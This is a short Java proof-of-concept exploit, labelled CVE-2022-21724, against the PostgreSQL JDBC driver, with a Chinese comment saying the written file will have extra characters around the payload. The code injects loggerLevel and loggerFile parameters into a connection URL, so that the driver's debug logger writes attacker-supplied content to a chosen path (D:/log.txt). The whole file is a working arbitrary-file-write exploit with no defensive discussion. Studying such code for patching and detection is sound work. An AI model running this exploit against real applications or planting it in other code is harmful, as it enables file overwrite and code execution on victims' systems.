package com.test.exp;

import org.postgresql.Driver;

import java.sql.SQLException;

// CVE-2022-21724
// 写入的文件前后会有其他字符
public class FileWrite {
    public static void main(String[] args) throws SQLException {
        String file = "file content";
        Driver driver = new Driver();
        String url1 = "jdbc:postgresql:///?loggerLevel=DEBUG&loggerFile=D:/log.txt&{{file}}";
        String replace = url1.replace("{{file}}", file);
        driver.connect(replace, null);
    }
}
